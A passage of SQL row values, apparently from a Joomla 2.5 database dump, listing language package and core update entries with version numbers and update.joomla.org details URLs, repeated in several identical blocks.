(852, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(853, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(854, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(855, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(856, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(857, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(858, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(859, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(860, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(861, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(862, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(863, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(864, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(865, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(866, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(867, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(868, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(869, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(870, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(871, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(872, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(873, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(874, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(875, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(876, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(877, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(878, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(879, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(880, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(881, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(882, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(883, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(884, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(885, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(886, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(887, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(888, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(889, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(890, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(891, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(892, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(893, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(894, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(895, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(896, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(897, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(898, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(899, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(900, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(901, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(902, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(903, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(904, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(905, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(906, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(907, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(908, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(909, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(910, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(911, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(912, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(913, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(914, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(915, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(916, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(917, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(918, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(919, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(920, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(921, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(922, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(923, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(924, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(925, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(926, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(927, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(928, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(929, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(930, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(931, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(932, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(933, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(934, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(935, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(936, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(937, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(938, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(939, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(940, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(941, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(942, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(943, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(944, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(945, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(946, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(947, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(948, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(949, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(950, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(951, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(952, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(953, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(954, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(955, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(956, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(957, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(958, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(959, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(960, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(961, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(962, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(963, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(964, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(965, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(966, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(967, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(968, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(969, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(970, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(971, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(972, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(973, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(974, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(975, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(976, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(977, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(978, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(979, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(980, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(981, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(982, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(983, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(984, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(985, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(986, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(987, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(988, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(989, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(990, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
(991, 3, 0, 0, 'Turkish', '', 'pkg_tr-TR', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/tr-TR_details.xml', ''),
(992, 3, 0, 0, 'Slovak', '', 'pkg_sk-SK', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/sk-SK_details.xml', ''),
(993, 3, 0, 0, 'Latvian', '', 'pkg_lv-LV', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/lv-LV_details.xml', ''),
(994, 3, 0, 0, 'Estonian', '', 'pkg_et-EE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/et-EE_details.xml', ''),
(995, 3, 0, 0, 'Flemish', '', 'pkg_nl-BE', 'package', '', 0, '2.5.27.1', '', 'http://update.joomla.org/language/details/nl-BE_details.xml', ''),
(996, 3, 0, 0, 'Macedonian', '', 'pkg_mk-MK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/mk-MK_details.xml', ''),
(997, 3, 0, 0, 'Japanese', '', 'pkg_ja-JP', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ja-JP_details.xml', ''),
(998, 3, 0, 0, 'Serbian Latin', '', 'pkg_sr-YU', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-YU_details.xml', ''),
(999, 3, 0, 0, 'Arabic Unitag', '', 'pkg_ar-AA', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ar-AA_details.xml', ''),
(1000, 3, 0, 0, 'German', '', 'pkg_de-DE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/de-DE_details.xml', ''),
(1001, 3, 0, 0, 'Norwegian Bokmal', '', 'pkg_nb-NO', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nb-NO_details.xml', ''),
(1002, 3, 0, 0, 'English AU', '', 'pkg_en-AU', 'package', '', 0, '2.5.22.2', '', 'http://update.joomla.org/language/details/en-AU_details.xml', ''),
(1003, 3, 0, 0, 'English US', '', 'pkg_en-US', 'package', '', 0, '2.5.22.1', '', 'http://update.joomla.org/language/details/en-US_details.xml', ''),
(1004, 3, 0, 0, 'Serbian Cyrillic', '', 'pkg_sr-RS', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sr-RS_details.xml', ''),
(1005, 3, 0, 0, 'Czech', '', 'pkg_cs-CZ', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/cs-CZ_details.xml', ''),
(1006, 3, 0, 0, 'Persian', '', 'pkg_fa-IR', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fa-IR_details.xml', ''),
(1007, 3, 0, 0, 'Polish', '', 'pkg_pl-PL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pl-PL_details.xml', ''),
(1008, 3, 0, 0, 'Syriac', '', 'pkg_sy-IQ', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sy-IQ_details.xml', ''),
(1009, 3, 0, 0, 'Portuguese', '', 'pkg_pt-PT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/pt-PT_details.xml', ''),
(1010, 3, 0, 0, 'Russian', '', 'pkg_ru-RU', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/ru-RU_details.xml', ''),
(1011, 3, 0, 0, 'Catalan', '', 'pkg_ca-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/ca-ES_details.xml', ''),
(1012, 3, 0, 0, 'Afrikaans', '', 'pkg_af-ZA', 'package', '', 0, '2.5.16.1', '', 'http://update.joomla.org/language/details/af-ZA_details.xml', ''),
(1013, 3, 0, 0, 'Chinese Simplified', '', 'pkg_zh-CN', 'package', '', 0, '2.5.20.1', '', 'http://update.joomla.org/language/details/zh-CN_details.xml', ''),
(1014, 3, 0, 0, 'Finnish', '', 'pkg_fi-FI', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/fi-FI_details.xml', ''),
(1015, 3, 0, 0, 'Chinese Traditional', '', 'pkg_zh-TW', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/zh-TW_details.xml', ''),
(1016, 3, 0, 0, 'Bosnian', '', 'pkg_bs-BA', 'package', '', 0, '2.5.24.1', '', 'http://update.joomla.org/language/details/bs-BA_details.xml', ''),
(1017, 3, 0, 0, 'Tamil India', '', 'pkg_ta-IN', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/ta-IN_details.xml', ''),
(1018, 3, 0, 0, 'Thai', '', 'pkg_th-TH', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/th-TH_details.xml', ''),
(1019, 3, 0, 0, 'Swahili', '', 'pkg_sw-KE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sw-KE_details.xml', ''),
(1020, 1, 0, 0, 'Joomla', '', 'joomla', 'file', '', 0, '2.5.28', '', 'https://update.joomla.org/core/extension.xml', ''),
(1021, 3, 0, 0, 'Armenian', '', 'pkg_hy-AM', 'package', '', 0, '2.5.28.3', '', 'http://update.joomla.org/language/details/hy-AM_details.xml', ''),
(1022, 3, 0, 0, 'Bahasa Indonesia', '', 'pkg_id-ID', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/id-ID_details.xml', ''),
(1023, 3, 0, 0, 'Danish', '', 'pkg_da-DK', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/da-DK_details.xml', ''),
(1024, 3, 0, 0, 'Swedish', '', 'pkg_sv-SE', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/sv-SE_details.xml', ''),
(1025, 3, 0, 0, 'Hungarian', '', 'pkg_hu-HU', 'package', '', 0, '2.5.14.1', '', 'http://update.joomla.org/language/details/hu-HU_details.xml', ''),
(1026, 3, 0, 0, 'French', '', 'pkg_fr-FR', 'package', '', 0, '2.5.28.2', '', 'http://update.joomla.org/language/details/fr-FR_details.xml', ''),
(1027, 3, 0, 0, 'Italian', '', 'pkg_it-IT', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/it-IT_details.xml', ''),
(1028, 3, 0, 0, 'Spanish', '', 'pkg_es-ES', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/es-ES_details.xml', ''),
(1029, 3, 0, 0, 'Dutch', '', 'pkg_nl-NL', 'package', '', 0, '2.5.28.1', '', 'http://update.joomla.org/language/details/nl-NL_details.xml', ''),
